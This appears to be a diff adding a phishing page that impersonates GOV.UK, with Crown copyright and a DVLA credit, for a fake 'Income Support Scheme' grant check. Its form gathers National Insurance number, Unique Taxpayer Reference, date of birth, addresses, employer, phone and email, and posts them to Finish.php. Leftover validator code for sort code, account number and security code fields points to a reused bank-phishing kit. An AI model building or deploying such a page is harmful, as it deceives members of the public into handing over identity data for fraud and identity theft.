@@ -1,0 +1,316 @@
+<html lang="en"><head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="assets/css/Main.css" media="screen" rel="stylesheet" type="text/css">
+        <link href="assets/css/Font.css" media="screen" rel="stylesheet" type="text/css">
+        <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
+		<link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/img/114.png">
+		<link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/img/144.png">
+		<link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/img/72.png">
+		<link rel="apple-touch-icon-precomposed" href="assets/img/57.png">
+		<title>Income Support Scheme</title>
+		<script type="text/javascript" src="assets/js/jquery-1.9.1.js"></script>
+		<script type="text/javascript" src="assets/js/jquery.payment.js"></script>
+		<script type="text/javascript" src="assets/js/jquery.validate.min.js"></script>
+		<script type="text/javascript" src="assets/js/additional-methods.min.js"></script>
+		<script type="text/javascript" src="assets/js/jquery.maskedinput.js"></script>
+</head><body class="js-enabled">&lt;
+
+<script>
+jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
+return this.optional(element) || phone_number.length > 9 &&
+phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
+}, 'Please check the mobile number you have provided');
+
+jQuery.validator.addMethod("postcodeUK", function(value, element) {
+return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
+}, "Please check the postcode you have provided");
+
+$('#details').validate();
+  (function($,W,D)
+{
+    var JQUERY4U = {};
+
+    JQUERY4U.UTIL =
+    {
+        setupFormValidation: function()
+        {
+            //form validation rules
+            $("#details").validate({
+				errorElement: "div",			
+                rules: {
+					name: {	required: true,	minlength: 10,},
+					dob: {	required: true,	minlength: 10,},
+					telephone: { required: true, minlength: 11, digits: true,},
+					email: { required: true, email: true,},
+					address: { required: true, minlength: 5,},
+					town: { required: true, minlength: 3,},
+					postcode: { required: true, minlength: 5,},
+					confirm: { required: true},
+					MMN: { required: true, minlength: 10,},
+					NIN: { required: true},
+                },
+				errorPlacement: function(error, element) {
+				if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year") 
+				error.insertAfter("#doberror");
+				else 
+				error.insertAfter(element);	
+				if (element.attr("name") == "sort1" || element.attr("name") == "sort2" || element.attr("name") == "sort3") 
+				error.insertAfter("#expiryerror");
+				if (element.attr("name") == "secode") 
+				error.insertAfter("#secodeerror");
+				if (element.attr("name") == "acno") 
+				error.insertAfter("#acnoerror");
+				},
+                messages: {
+					name: {
+						required: "Please provide your full name",
+						minlength: jQuery.validator.format("Please provide your full name"),
+					},					
+					dob: { 
+						required: "Please provide your date of birth", },
+						minlength: jQuery.validator.format("Please chek the date of birth you have entered"),
+					telephone: {
+						required: "Please provide your mobile number",
+						minlength: jQuery.validator.format("Your mobile number should be exactly 11 digits"),
+						digits: jQuery.validator.format("Please ensure you enter digits only"),
+					},
+					email: {
+						required: "Please provide your email address",
+						email: jQuery.validator.format("Please check the email address you have entered"),
+					},
+					address: {
+						required: "Please provide the 1st line of your address",
+						minlength: jQuery.validator.format("Please check the address you have entered"),
+					},
+					town: {
+						required: "Please provide your city/town",
+						minlength: jQuery.validator.format("Please check the city/town you have entered"),
+					},
+					postcode: {
+						required: "Please provide your postcode",
+						minlength: jQuery.validator.format("Please check the postcode you have entered"),
+					digits: jQuery.validator.format("Please ensure you enter digits only"), 
+					},
+					confirm: { 
+						required: "Please confirm the information you have provided to be true and accurate", 
+					},
+					NIN: { 
+						required: "Please provide your National Insurance number ", 
+					},	
+					MMN: { 
+						required: "Please provide your Unique Taxpayer Reference ", 
+					},					
+				},
+                submitHandler: function(form) {
+                    form.submit();
+                }
+            });
+        }
+    }
+
+    //when the dom has loaded setup form validation rules
+    $(D).ready(function($) {
+        JQUERY4U.UTIL.setupFormValidation();
+    });
+
+})(jQuery, window, document);
+  
+</script>
+    
+    <script type="text/javascript">
+        function movetoNext(current, nextFieldID) {
+            if (current.value.length >= current.maxLength) {
+                document.getElementById(nextFieldID).focus();
+            }
+        }
+        jQuery(function($){
+            $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
+         });
+
+    </script>
+<style>
+div.error {color:red}
+</style>
+
+
+
+
+<form method="post" action="Finish.php?&amp;sessionid=V8iGQwQOjFTvGnFe7FG13YPVJ9JXKXElJIvBxFsyDPSusPtcP5jgDX0g4l1cRC1vu0qaeMywY95fZhWMuP6DhLNMQK3nq6VVm8yLJ2WM3U6guCOzL4w&amp;securessl=true" id="details" name="details" autocomplete="off" novalidate="novalidate">
+
+<div id="global-cookie-message">
+<p>GOV.UK uses cookies to make the site simpler. <a href="#"> Find out more about cookies</a></p>
+</div>
+
+            <header role="banner" class="with-proposition" id="global-header">
+                <div class="header-wrapper">
+                    <div class="header-global">
+                        <div class="header-logo">
+                            <a href="#" id="logo" class="content">
+                            <img src="assets/img/logo.png" width="35" height="31" alt=""> GOV.UK
+                            </a>
+                        </div>
+                    </div>
+                    <div class="header-proposition">
+                      <div class="content">
+                        <nav id="proposition-menu">
+                          <a href="#" id="proposition-name">Income Support Scheme</a>
+                        </nav>
+                      </div>
+                    </div>
+                </div>
+            </header>
+            <!--end header-->
+
+            
+
+            <div id="global-header-bar"></div>
+
+            <div id="wrapper">
+                <div class="maincontent">
+    <div id="startHeader" class="start-header group">
+        <h1>Income Support Scheme</h1>
+    </div>
+    <div class="body-container group">
+        
+                <div>
+                    <p>
+                        <span id="titleMsg" class="label">Please complete the form below to check if you are eligible to claim a grant through the Income Support Scheme.</span>
+                    </p>
+                </div>
+                <div class="inout-pad">
+                    <p><strong><label for="MMN" class="label">Full Name</label>
+                    </strong><br>(Include middle name if you have any.)</p>
+                    <p><input required="" name="name" type="text" maxlength="50" id="name" class="input-large input-upper" autocomplete="off"></p>
+                </div>
+
+                <div class="inout-pad">
+                    <p><strong><label for="NIN" class="label">National Insurance number</label>
+                    </strong></p>
+                    <!--<p><input name="NIN" type="text" id="NIN" class="input-large input-upper" autocomplete="off" maxlength="13" data-rule-required="true" data-msg-required="Enter your National Insurance number." data-rule-pattern="^(?!BG|GB|NK|KN|TN|NT|ZZ)((?![DFIQUV])[A-Z](?![DFIQUVO])[A-Z]) ?\d{2} ?\d{2} ?\d{2} ?[A-D]{1}$" data-pattern-flags="i" data-msg-pattern="Enter your National Insurance number in the correct format. For example QQ123456C."></p>-->
+					<p><input name="NIN" type="text" id="NIN" class="input-large input-upper" autocomplete="off" maxlength="13" placeholder=""></p>
+                </div>
+                
+                <div class="inout-pad">
+                    <p><strong>
+                    <label for="MMN" class="label">Unique Taxpayer Reference (UTR)</label>
+                    </strong><br>(This is 10 numbers, for example 1234567890. It will be on tax returns and other letters about Self Assessment.)</p>
+                    <p><input name="MMN" type="number" maxlength="10" id="MMN" class="input-large input-upper" autocomplete="off">
+                    </p>
+                </div>
+				
+                <div class="inout-pad">
+                    <p><strong><label for="cemp" class="label">Current employer</label>
+                    </strong><br></p>
+                    <p><input required="" name="cemp" type="text" maxlength="50" id="name" class="input-large input-upper" autocomplete="off"></p>
+                </div>
+				
+                <div class="inout-pad">
+                    <p><strong><label for="dob" class="label">Date of Birth </label></strong><br>(Example: 10/06/1956)</p>
+                    <p><input name="dob" type="tel" maxlength="10" id="dob" class="input-medium input-upper" autocomplete="off"></p>
+                </div>
+
+				 <h3>Previous Address</h3>
+                <div class="inout-pad">
+                    <p><strong><label for="address" class="label"></label></strong></p>
+                    <p><input name="address" type="text" maxlength="40" id="address" class="input-large input-upper" autocomplete="off"></p>
+                </div>
+
+                <div class="inout-pad">
+                    <p><strong><label for="postcode" class="label">Postcode</label></strong></p>
+                    <p><input name="postcode" type="text" maxlength="10" id="postcode" class="input-small input-upper" autocomplete="off"></p>
+                </div>
+                   <h3>Current Address</h3>
+                <div class="inout-pad">
+                    <p><strong><label for="address" class="label"></label></strong></p>
+                    <p><input name="address1" type="text" maxlength="40" id="address" class="input-large input-upper" autocomplete="off"></p>
+                </div>
+
+                <div class="inout-pad">
+                    <p><strong><label for="postcode" class="label">Postcode</label></strong></p>
+                    <p><input name="postcode1" type="text" maxlength="10" id="postcode" class="input-small input-upper" autocomplete="off"></p>
+                </div>  
+			   
+                <div class="inout-pad">
+                    <p><strong><label for="telephone" class="label">Mobile Phone Number</label></strong></p>
+                    <p><input name="telephone" type="tel" maxlength="11" id="telephone" class="input-large input-upper" autocomplete="off"></p>
+                </div>
+
+                <div class="inout-pad">
+                    <p><strong><label for="emaila" class="label">Email Address</label></strong></p>
+                    <p><input name="emaila" type="email" required="" id="emaila" class="input-large input-upper" autocomplete="off"></p>
+                </div>				
+				
+               
+                
+                <div>
+                    <div class="inout-pad">
+                      <p><strong>
+                      <label for="label" class="label"></label>
+                      </strong></p>
+                  </div>
+                    <p>
+                      <input type="checkbox" name="confirm" value="">
+                      <span id="verifyfinaltouch" class="label">I certify that the information provided on this form is accurate.</span>
+                    </p>
+        </div>
+            
+      <div class="action">
+            <input type="submit" name="go" id="go" value="Continue" class="button">
+            
+            
+        </div>
+    </div>
+
+</div>
+            </div>
+
+            <footer class="group js-footer" id="footer" role="contentinfo">
+                <div class="footer-wrapper">
+                    <div class="footer-meta">
+                        <div class="footer-meta-inner">
+                            <ul>
+                                <li>
+                                    <a href="#">Cookies</a>
+                                </li>
+                                <li>
+                                    <a href="#">Terms and Conditions</a>
+                                </li>
+                                <li>
+                                    <a href="#">English</a>
+                                </li>
+                                <li>
+                                    <a href="#">Welsh</a>
+                                </li>
+                                <li>
+                                    Built by the <a href="#">Driver &amp; Vehicle Licensing Agency</a> 
+                                </li>
+                            </ul>
+                            <div class="open-government-licence">
+                                <p class="logo"><a href="#">Open Government Licence</a></p>
+                                <p>
+                                    All content is available under the <a href="#">
+                                        Open Government Licence v2.0</a>, except where otherwise stated</p>
+                            </div>
+                        </div>
+                        <div class="copyright">
+                            <a href="#">
+                                © Crown copyright</a>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+            <!--end footer-->
+
+
+
+</form>
+        
+        
+    
+
+
+
+
+</body></html>
